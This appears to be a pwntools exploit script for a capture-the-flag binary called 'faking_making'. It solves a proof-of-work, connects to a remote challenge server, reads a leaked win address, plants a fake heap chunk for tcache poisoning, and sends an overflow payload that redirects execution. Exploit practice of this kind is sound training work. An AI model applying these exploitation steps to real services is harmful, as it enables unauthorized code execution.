from pwn import *
import random
import hashlib
import string
from itertools import islice
elf = context.binary = ELF("./faking_making")
context.log_level = logging.DEBUG
context.terminal = ["tmux", "splitw", "-h"]

def random_char(size):
	selection = iter(lambda: random.choice("abcdefghijklmnopqrtuvwxyz"),object())
	yield ''.join(islice(selection, size))

def encrypt(random_gen):
	return hashlib.sha256(random_gen.encode("ascii"))

def proof_of_work(p):
	p.recvuntil("= ")
	md5 = str(p.recv(6))[2:-1]
	while True:
		random_gen = [x for x in random_char(4)][0]
		value = encrypt(random_gen).hexdigest()[-6:]
		if md5 == value:
			break
	print("PoW is: ",random_gen)
	p.sendline(random_gen)

def do_remote():
	p = remote("161.97.176.150", 2929)
	proof_of_work(p)
	p.recvuntil("\n")
	p.recvuntil("\n")
	return p
def do_debug():
	return gdb.debug(elf.path, gdbscript = """
												break main
""")
p = do_remote()
win_offset = int(p.recv(14).decode("ascii"),16)
print("win leak: %x"%win_offset)

fake_chunk1 = p64(0) + p64(0x40) + 6*p64(0)
# fake_chunk2 = p64(0) + p64(0x11) + 2*p64(0)
# print(hex(len(fake_chunk1+fake_chunk2)))
p.send(fake_chunk1 )
input("tcahce poisoned ... ")
p.sendline(0x58*b"A"+p64(win_offset+18) + p64(win_offset))
p.interactive()
